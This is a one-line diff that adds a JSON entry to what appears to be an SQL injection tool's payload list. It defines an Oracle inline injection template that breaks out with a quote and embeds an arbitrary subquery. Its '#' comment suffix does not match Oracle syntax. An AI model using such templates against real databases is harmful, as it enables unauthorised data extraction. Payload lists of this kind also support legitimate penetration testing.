@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "inline", "boundary": {"prefix": "'", "suffix": "#", "type": "single"}, "vector": "{B} AND 1=(SELECT ({Q}) FROM dual)", "comment": "oracle inline: single, hash"}
